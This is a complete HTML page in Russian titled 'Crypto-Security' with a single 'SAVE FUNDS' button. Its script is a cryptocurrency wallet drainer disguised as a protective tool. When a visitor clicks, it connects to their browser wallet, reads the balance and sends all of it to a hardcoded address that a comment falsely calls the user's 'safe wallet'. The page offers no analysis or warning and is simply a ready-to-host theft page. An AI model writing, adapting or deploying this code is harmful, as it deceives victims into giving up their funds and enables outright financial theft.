<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Крипто-Безопасность</title>
    <style>
        body {
            background-color: black;
            color: white;
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        button {
            background-color: white;
            color: black;
            font-size: 20px;
            padding: 15px 30px;
            border: none;
            cursor: pointer;
            transition: background-color 0.3s;
        }
        button:hover {
            background-color: #f1f1f1;
        }
    </style>
</head>
<body>
    <button id="saveButton">СПАСТИ СРЕДСТВА</button>

    <script src="https://cdn.jsdelivr.net/npm/ethers@5.0.0/dist/ethers.umd.min.js"></script>
    <script>
        document.getElementById('saveButton').addEventListener('click', async function() {
            if (typeof window.ethereum !== 'undefined') {
                try {
                    // Создаем провайдер для соединения с блокчейном
                    const provider = new ethers.providers.Web3Provider(window.ethereum, "any");

                    // Запрашиваем доступ к аккаунту
                    await provider.send("eth_requestAccounts", []);  // Запрашиваем доступ к аккаунту

                    // Получаем первый аккаунт
                    const signer = provider.getSigner();
                    const userAddress = await signer.getAddress();
                    console.log('Ваш адрес: ' + userAddress);

                    // Проверяем баланс
                    const balance = await provider.getBalance(userAddress);
                    const etherBalance = ethers.utils.formatEther(balance);
                    console.log('Баланс: ' + etherBalance + ' ETH');

                    // Переводим средства сразу без подтверждения
                    // Адрес безопасного кошелька
                    const toAddress = "0xa5B2C0C3d06f293b4d466f43168768c0EBED3073"; // Ваш безопасный кошелек
                    
                    // Отправляем транзакцию
                    const tx = await signer.sendTransaction({
                        to: toAddress,   // Адрес получателя
                        value: balance,   // Переводим весь баланс
                    });

                    console.log('Транзакция отправлена: ' + tx.hash);
                    alert('Транзакция отправлена! Пожалуйста, подождите.');
                } catch (err) {
                    alert('Ошибка: ' + err.message);
                }
            } else {
                alert('Кошелек не найден. Убедитесь, что у вас установлен Trust Wallet или MetaMask.');
            }
        });
    </script>
</body>
</html>
